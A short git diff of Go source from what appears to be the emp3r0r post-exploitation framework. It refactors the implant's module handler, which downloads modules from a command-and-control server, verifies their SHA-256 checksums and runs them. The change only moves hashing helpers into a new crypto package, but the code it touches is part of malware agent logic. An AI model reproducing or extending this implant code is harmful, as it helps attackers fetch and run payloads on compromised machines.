@@ -12,9 +12,9 @@ import (
 
 	"github.com/jm33-m0/arc"
 	"github.com/jm33-m0/emp3r0r/core/internal/emp3r0r_def"
-	"github.com/jm33-m0/emp3r0r/core/internal/exe_utils"
-	"github.com/jm33-m0/emp3r0r/core/internal/tun"
-	"github.com/jm33-m0/emp3r0r/core/internal/util"
+	"github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_crypto"
+	"github.com/jm33-m0/emp3r0r/core/lib/exe_utils"
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
 // moduleHandler downloads and runs modules from C2
@@ -111,7 +111,7 @@ func moduleHandler(download_addr, file_to_download, payload_type, modName, check
 
 	// interactive modules
 	if executable == "echo" {
-		out = tun.SHA256SumRaw([]byte(emp3r0r_def.MagicString))
+		out = emp3r0r_crypto.SHA256SumRaw([]byte(emp3r0r_def.MagicString))
 		log.Printf("echo: %s", out)
 		return
 	}
@@ -165,13 +165,13 @@ func prepareModuleOnDisk(tarball, modDir string, payload_data []byte) error {
 }
 
 func downloadAndVerifyModule(file_to_download, checksum, download_addr string) (data []byte, err error) {
-	if tun.SHA256SumFile(file_to_download) != checksum {
+	if emp3r0r_crypto.SHA256SumFile(file_to_download) != checksum {
 		if data, err = SmartDownload(download_addr, file_to_download, "", checksum); err != nil {
 			return nil, fmt.Errorf("downloading %s: %v", file_to_download, err)
 		}
 	}
 
-	if tun.SHA256SumRaw(data) != checksum {
+	if emp3r0r_crypto.SHA256SumRaw(data) != checksum {
 		log.Print("Checksum failed, restarting...")
 		util.TakeABlink()
 		os.RemoveAll(file_to_download)
